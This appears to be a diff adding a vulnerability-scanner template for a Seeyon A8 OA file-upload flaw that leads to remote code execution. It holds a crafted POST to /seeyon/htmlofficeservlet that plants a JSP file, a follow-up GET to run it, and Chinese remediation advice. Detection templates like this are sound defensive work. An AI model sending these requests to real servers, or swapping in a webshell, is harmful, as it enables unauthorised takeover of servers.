@@ -1,0 +1,60 @@
+id: CNVD-2019-19299
+info:
+  name: Seeyon A8 - Remote Code Execution
+  author:
+  - l0ne1y
+  description: |-
+    致远A8任意文件上传导致RCE
+    攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后门文件，从而获取目标服务器权限，在目标服务器上执行任意代码。
+  severity: high
+  remediation: |-
+    #### 官方修复方案
+    致远公司已发布补丁完成修复，并成立专项小组，对涉及以上版本的用户进行排查。补丁和更新信息获取方式如下：
+    1. 登录致远互联服务网站（http://support.seeyon.com）获取补丁；
+    2. 关注“致远互联微服务”公众号，及时获取安全更新通知；
+    3. 如有技术问题可联系致远公司，Email：security@seeyon.com，电话：400-700-8822。
+
+
+    #### 临时修补方案如下：
+    1. 配置URL访问控制策略；
+    2. 在公网部署的致远A8+服务器，通过ACL禁止外网对“/seeyon/htmlofficeservlet”路径的访问；
+    3. 对OA服务器上的网站后门文件进行及时查杀。
+
+    建议使用致远OA-A8系统的信息系统运营者进行自查，发现存在漏洞后，按照以上方案及时修复。
+    另，致远OA在部分企事业单位的内网办公系统应用也较为广泛，建议及时进行自查和修复。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_2 == 200
+    - contains(body_1, "htmoffice operate")
+    - contains(body_2, "{{randomValue}}")
+  raw:
+  - |
+    POST /seeyon/htmlofficeservlet HTTP/1.1
+    Host: {{Hostname}}
+    Pragma: no-cache
+    Cache-Control: no-cache
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q =0.8,application/signed-exchange;v=b3
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+    Connection: close
+
+    DBSTEP V3. 0 343 0 658 DBSTEP=OKMLlKlV
+    OPTION=S3WYOSWLBSGr
+    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+    = WUghPB3szB3Xwg66 the CREATEDATE
+    recordID = qLSGw4SXzLeGw4V3wUw3zUoXwid6
+    originalFileId = wV66
+    originalCreateDate = wUghPB3szB3Xwg66
+    FILENAME = qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdb4o5nHzs
+    needReadFile = yRWZdAS6
+    originalCreateDate IZ = 66 = = wLSGP4oEzLKAz4
+    <%out.print({{randomValue}});%>
+  - |
+    GET /seeyon/test123456.jsp HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
+variables:
+  randomValue: '{{rand_int(200000000, 210000000)}}'
